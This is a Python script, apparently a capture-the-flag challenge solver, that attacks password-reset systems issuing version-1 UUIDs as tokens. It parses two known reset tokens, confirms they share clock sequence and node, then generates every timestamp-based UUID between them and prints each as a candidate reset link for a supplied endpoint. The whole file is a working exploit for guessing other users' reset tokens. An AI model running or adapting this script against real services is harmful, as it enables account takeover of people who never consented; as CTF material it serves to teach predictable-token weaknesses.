import sys
import uuid
from urllib.parse import quote

# Needs to be synced with chall MOFIFIER
MODIFIER = 1

def parse_uuid1(token: str) -> tuple[int, int, int]:
    try:
        parsed = uuid.UUID(token)
    except ValueError as exc:
        raise ValueError(f"Invalid UUID: {token}") from exc

    if parsed.version != 1:
        raise ValueError(f"UUID is not version 1: {token}")

    if parsed.variant != uuid.RFC_4122:
        raise ValueError(f"UUID is not RFC 4122 variant: {token}")

    return parsed.time, parsed.clock_seq, parsed.node


def get_uuid1(timestamp: int, clock_seq: int, node: int) -> str:
    if not (0 <= clock_seq < (1 << 14)):
        raise ValueError("clock_seq must be a 14-bit integer")

    if not (0 <= node < (1 << 48)):
        raise ValueError("node must be a 48-bit integer")

    time_low: int = timestamp & 0xFFFFFFFF
    time_mid: int = (timestamp >> 32) & 0xFFFF
    time_hi: int = (timestamp >> 48) & 0x0FFF

    time_hi_and_version: int = time_hi | (1 << 12)

    clock_seq_low: int = clock_seq & 0xFF
    clock_seq_hi: int = (clock_seq >> 8) & 0x3F

    clock_seq_hi_and_reserved: int = clock_seq_hi | 0x80

    uuid_str: str = (
        f"{time_low:08x}-"
        f"{time_mid:04x}-"
        f"{time_hi_and_version:04x}-"
        f"{clock_seq_hi_and_reserved:02x}{clock_seq_low:02x}-"
        f"{node:012x}"
    )

    return uuid_str

def build_reset_link(base_reset_url: str, token: str) -> str:
    return base_reset_url.format(token=token)

def main() -> int:
    first_token = input("First reset UUIDv1: ").strip()
    second_token: str = input("Second reset UUIDv1: ").strip()

    try:
        first_time, first_clock_seq, first_node = parse_uuid1(first_token)
        second_time, second_clock_seq, second_node = parse_uuid1(second_token)
    except ValueError as exc:
        print(f"Error: {exc}")
        return 1

    if (first_clock_seq, first_node) != (second_clock_seq, second_node):
        print("ERROR: tokens have different clock_seq/node values.")
        return 1
        

    base_reset_url =  input("Reset URL endpoint: ").strip()
    low, high = sorted((first_time, second_time))

    if low > high:
        print("No timestamps in the requested range.")
        return 0

    total = high - low + 1
    print(f"Candidate timestamps: {total}")


    timestamp = low

    while timestamp <= high:
        candidate_token: str = get_uuid1(timestamp, first_clock_seq, first_node)
        print(build_reset_link(base_reset_url, candidate_token))
        
        timestamp += 1 * MODIFIER

    return 0


if __name__ == "__main__":
    sys.exit(main())
